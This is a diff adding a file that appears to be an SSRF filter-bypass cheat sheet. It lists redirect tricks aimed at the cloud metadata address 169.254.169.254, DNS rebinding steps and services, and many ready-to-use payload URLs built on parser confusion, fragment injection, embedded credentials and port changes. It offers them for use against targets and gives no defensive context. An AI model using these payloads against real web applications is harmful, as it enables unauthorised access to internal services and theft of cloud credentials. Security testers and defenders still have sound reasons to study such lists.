@@ -1,0 +1,47 @@
+# Redirect Chain SSRF Bypass Techniques
+# Use these with external servers you control
+
+# Basic redirect
+# Server returns: HTTP 302 Location: http://169.254.169.254/
+
+# Multiple hops
+# http://your-server.com/redirect1 -> http://your-server.com/redirect2 -> http://internal
+
+# Protocol downgrade
+# HTTPS -> HTTP redirect to bypass HTTPS-only filters
+# https://your-server.com/ -> http://internal-service/
+
+# URL shorteners (if allowed)
+# bit.ly, tinyurl.com - create short URL pointing to internal
+
+# DNS rebinding
+# 1. Set up DNS with low TTL
+# 2. First request resolves to allowed IP
+# 3. DNS changed to internal IP before second request
+# 4. Second request hits internal service
+
+# Services for testing:
+# - rebind.network
+# - nip.io (*.127.0.0.1.nip.io)
+# - sslip.io
+# - xip.io
+
+# Parser confusion
+http://allowed.com@internal.com/
+http://allowed.com%40internal.com/
+http://internal.com#@allowed.com
+http://internal.com?@allowed.com
+
+# Fragment injection
+http://allowed.com#http://internal.com
+http://allowed.com/#@internal.com
+
+# Auth in URL
+http://user:pass@internal.com/
+http://internal.com:pass@allowed.com/
+
+# Port variations
+http://internal.com:80/
+http://internal.com:443/
+http://internal.com:8080/
+http://internal.com:3000/
